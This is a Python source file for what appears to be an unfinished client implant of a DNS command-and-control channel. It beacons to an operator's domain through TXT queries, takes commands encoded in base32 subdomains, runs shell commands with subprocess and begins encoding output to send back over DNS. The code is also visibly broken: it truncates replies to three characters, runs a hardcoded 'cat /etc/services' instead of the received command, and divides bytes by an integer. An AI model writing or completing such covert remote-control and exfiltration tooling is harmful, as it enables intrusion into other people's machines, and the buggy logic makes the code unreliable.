#!/usr/bin/env/python3
import dns.resolver
import argparse
import base64
import datetime
from time import sleep
import subprocess

# colorize output
OV = '\x1b[0;33m' # verbose
OR = '\x1b[0;34m' # routine
OE = '\x1b[1;31m' # error
OM = '\x1b[0m'    # mischief managed

maxAReq = 63
maxResp = 253

def decode(b64):
    revert = b64.replace("-","=")
    return base64.b32decode(str(revert,"UTF"))

def encode(plain):
    switch = plain.replace("=","-") # "equals" isn't allowed to play in domain names
    return base64.b32encode(bytes(switch,"UTF"))

class job:
    def __init__(self, id, domain, command, start):
        self.id = id
        self.domain = domain
        self.command = command
        self.start = datetime.datetime.now()
    # perform command
    # send output back in X batches
    # limit queries to 253 chars - incl domain

def main():
    parser = argparse.ArgumentParser(description='Connect to an Obvious DNS C2 server.')
    parser.add_argument('domain', help="DNS name to send traffic to. You must have an NS record pointing to the host running the ODC2 Server.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
    parser.add_argument('-d','--delay', default=5, type=int, help='Number of seconds to wait between beacons to C2.')
    parser.add_argument('-t','--timeout', default=3, type=float, help='Timeout in ms to C2.')
    args = parser.parse_args()
    debuggin = args.verbose
    if debuggin:
        print(f"{OV}* Verbose output enabled{OM}")
        print(f"{OV}* Delay between beacons set to {OR}{args.delay}{OM}")
    print(f"{OR}Connecting to {OV}{args.domain}{OM}")
    try:
        res = dns.resolver.Resolver()
        res.timeout = args.timeout
        while True:
            sleep(args.timeout)
            subd = encode("CHK" + str(datetime.datetime.now())) # check in for commands
            answer = res.query(subd + args.domain, "TXT")
            answer = decode(answer[0].to_text())[:3]
            msgType = answer[:3]
            if msgType == "NUL": # nop if nothing from server
                if debuggin: print(f"{OV}NUL from server{OM}")
            elif msgType == "DIE": # stop if told so
                print(f"{OR}DIE message received; I'm out")
                break
            elif msgType == "HDR": # command header; process
                if debuggin: print(f"{OV}HDR from server{OM}")
                cmdPktCt = int(answer[3:]) # how many lines long is the command?
                command = ""
                for i in range(cmdPktCt): # get all lines
                    subd = encode("CON" + str(datetime.datetime.now()))
                    answer = res.query(subd + args.domain, "TXT")
                    answer = decode(answer[0].to_text())[:3]
                    msgType = answer[:3]
                    command += answer[3:]
                output = subprocess.check_output("cat /etc/services", shell=True)
                codedOutput = encode(output)
                respPktCt = int(codedOutput / 63) + 1 # number of packets to send response
                
            # if the answer comes back a certain way, make it a job
    except KeyboardInterrupt:
        pass
    finally:
        pass
    
    # answers = dns.resolver.query('dnspython.org', 'MX')
    # for rdata in answers:
    #     print('Host', rdata.exchange, 'has preference', rdata.preference)

main()